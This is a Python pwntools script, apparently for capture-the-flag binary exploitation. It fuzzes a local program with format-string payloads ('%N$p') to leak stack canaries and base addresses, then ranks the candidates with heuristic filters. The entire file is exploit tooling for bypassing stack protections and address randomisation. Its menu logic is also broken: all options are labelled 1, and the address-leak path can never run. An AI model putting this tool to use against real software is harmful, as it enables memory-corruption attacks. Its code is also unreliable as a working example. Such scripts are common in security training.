import signal
import time
from colorama import Fore
from pwn import *
import os

def signal_handler(sig, frame):
    print('\nYou pressed Ctrl+C! Exiting...')
    sys.exit(0)

def detect_canaries(program_name, detect_type='canary', option=None, choice=None):
    context.log_level = 'error'
    elf = context.binary = ELF(f'./{program_name}', checksec=False)

    signal.signal(signal.SIGINT, signal_handler)

    while True:
        if detect_type == 'canary':
            print(f"\n{Fore.YELLOW}[+]{Fore.RESET} Please select an option: \n")
            print(f"{Fore.BLUE}[1]{Fore.RESET} Find the canary")
            print(f"{Fore.BLUE}[2]{Fore.RESET} Go back to main menu")
        else:  # detect_type is 'address'
            print(f"\n{Fore.YELLOW}[+]{Fore.RESET} Please select an option: \n")
            print(f"{Fore.BLUE}[1]{Fore.RESET} Find a leaked address")
            print(f"{Fore.BLUE}[2]{Fore.RESET} Go back to main menu")

        if option is None:  # If no option is provided as an argument, ask for user input
            option = input(f"\n{Fore.YELLOW}[+]{Fore.RESET} Your choice: ").strip()
        
        # Option 1: Find the canary
        if detect_type == 'canary':
            if option == '1':
                while True:
                    potential_canaries = []
                    for i in range(1, 101):
                        try:
                            p = process(elf.path)
                            p.sendline('%{}$p'.format(i).encode())
                            p.recvline()

                            result = p.recvline().decode().strip()

                            if result.endswith('00') and not result.startswith('f7') and not result.startswith('7f'):
                                potential_canaries.append((i, result))

                            p.close()
                        except EOFError:
                            pass
                    
                    print(f"\n{Fore.GREEN}The intelligence checks we use to find the potential canaries are: ")
                    print(f"{Fore.GREEN}   It ends with '00'")
                    print(f"{Fore.GREEN}   It does not start with 'f7'")
                    print(f"{Fore.GREEN}   It does not start with '7f'")
                    print(f"\n{Fore.YELLOW}[+]{Fore.RESET}These are the potential canary addresses\n")
                    for idx, (pos, canary) in enumerate(potential_canaries):
                        print(f"{Fore.YELLOW}{idx+1}{Fore.RESET}: Position = {Fore.GREEN}{pos}{Fore.RESET}, Canary = {Fore.GREEN}{canary}{Fore.RESET}")
                    time.sleep(1)
                    if choice is None:
                        choice = input(f"\n{Fore.YELLOW}[+]{Fore.RESET} Choose a canary (Enter a number or r to rerun): ").strip()

                    if choice.lower() == 'r':
                        choice = None
                        continue
                    else:
                        try:
                            # Check if the user's choice is a valid index in the list of potential canaries
                            choice = int(choice)
                            if 1 <= choice <= len(potential_canaries):
                                chosen_canary = potential_canaries[choice - 1]
                                print(f"{Fore.YELLOW}[+]{Fore.RESET} You have chosen: Position = {Fore.GREEN}{chosen_canary[0]}{Fore.RESET}, Canary = {Fore.GREEN}{chosen_canary[1]}{Fore.RESET}")
                                return chosen_canary  # Return the chosen canary as a tuple
                            else:
                                print(f"\n{Fore.RED}[-]{Fore.RESET} Invalid option!\n")
                        except ValueError:
                            print(f"\n{Fore.RED}[-]{Fore.RESET} Invalid option!\n")
 
            elif option == '2':
                print(f"\n{Fore.RED}[-]{Fore.RESET} You have not chosen a canary yet so, the result of the canary will be None")
                return None, None  # Return None for both values to indicate going back to the main menu
            else:
                print(f"{Fore.RED}[-]{Fore.RESET} Invalid option!")
            
        else:  # detect_type is 'address
            if option == '1':
                # Option 2: Find a leaked address
                while True:
                    potential_addresses = []

                    for i in range(1, 31):
                        try:
                            last_values = []

                            # We need to run this multiple times for a single i to check consistency
                            for _ in range(5):
                                # Create process
                                p = process(elf.path)
                                p.sendline('%{}$p'.format(i).encode())
                                p.recvline()

                                result = p.recvline().decode().strip()

                                if result and result != "(nil)" and len(result) >= 4:
                                    last_two = result[-2:]  # get the last 2 digits
                                    consecutive_zeros = result.count('00')

                                    if last_two != 'ff' and consecutive_zeros <= 9:
                                        last_values.append(last_two)

                                # If we've run it 5 times and the last 2 digits stayed the same, print it
                                if len(last_values) == 5 and len(set(last_values)) == 1:
                                    potential_addresses.append((i, result))

                                p.close()
                        except EOFError:
                            pass
                    print(f"\n{Fore.GREEN}The intelligence checks we use to find potential base addresses are: ")
                    print(f"{Fore.GREEN}   Verify if the last two characters of the result are not 'ff'")
                    print(f"{Fore.GREEN}   Check if the result contains '00' less than or equal to 9 times")
                    print(f"{Fore.GREEN}   Consider the potential address valid if after 5 runs, the last two characters remain the same")

                    print(f"\n{Fore.YELLOW}[+]{Fore.RESET} These are the potential leaked addresses\n")
                    for idx, (pos, addr) in enumerate(potential_addresses):
                        print(f"{Fore.YELLOW}{idx+1}{Fore.RESET}: Position = {Fore.GREEN}{pos}{Fore.RESET}, Leaked address = {Fore.GREEN}{addr}{Fore.RESET}")
                    time.sleep(1)
                    if choice is None:
                        choice = input(f"{Fore.YELLOW}[+]{Fore.RESET} Choose a leaked address (Enter a number or r to rerun): ").strip()

                    if choice.lower() == 'r':
                        choice = None
                        continue
                    else:
                        try:
                            choice = int(choice)
                            if 1 <= choice <= len(potential_addresses):
                                chosen_addr = potential_addresses[int(choice)-1]
                                print(f"{Fore.YELLOW}[+]{Fore.RESET} You have chosen: Position = {Fore.GREEN}{chosen_addr[0]}{Fore.RESET}, Leaked address = {Fore.GREEN}{chosen_addr[1]}{Fore.RESET}")
                                return chosen_addr  # Return the chosen address position as a tuple
                            else:
                                print(f"\n{Fore.RED}[-]{Fore.RESET} Invalid option!\n")
                        except ValueError:
                            print(f"\n{Fore.RED}[-]{Fore.RESET} Invalid option!\n")
            elif option == '2':
                print(f"\n{Fore.RED}[-]{Fore.RESET} You have not chosen a address yet so, the result of the address pointer will be None")
                return None, None  # Return None for both values to indicate going back to the main menu
            else:
                print(f"{Fore.RED}[-]{Fore.RESET} Invalid option!")

def main():
    choice = input(f"{Fore.YELLOW}[+]{Fore.RESET} Choose a program to analyze or exploit, for example 'dungeon1' \n").strip()
    program_name = choice 
    
    if os.path.isfile(program_name):
        print(f"{Fore.GREEN}[+]{Fore.RESET} Program '{program_name}' exists.")
        # ... rest of your code here ... 
    
        print(f"{Fore.YELLOW}[+]{Fore.RESET} Choose the type of fuzzer you want to use :\n")
        print(f"{Fore.BLUE}[1]{Fore.RESET} Leaking the canary pointer ")
        print(f"{Fore.BLUE}[1]{Fore.RESET} Leaking an base address pointer ")
        print(f"{Fore.BLUE}[1]{Fore.RESET} Leaking both of them\n")
        option = input(f"{Fore.YELLOW}[+]{Fore.RESET} Enter your choice: ").strip()

        if option == '1':
            detect_type = 'canary'
            detect_canaries(program_name, detect_type, '1')
            return
        elif option == '2':
            detect_type = 'address'
            detect_canaries(program_name, detect_type, '2')
            return
        elif option == '3':
            detect_type = 'canary'
            detect_canaries(program_name, detect_type, '1')
            detect_type = 'address'
            detect_canaries(program_name, detect_type, '2')
        else:
            print("Invalid choice. Exiting.")
            return
        option = None  # If you want to provide an option, put it here
        choice = None  # If you want to provide a choice, put it here

    else:
        print(f"{Fore.RED}[-]{Fore.RESET} Program '{program_name}' does not exist, please provide a valid program")
        return
    
if __name__ == '__main__':
    main()
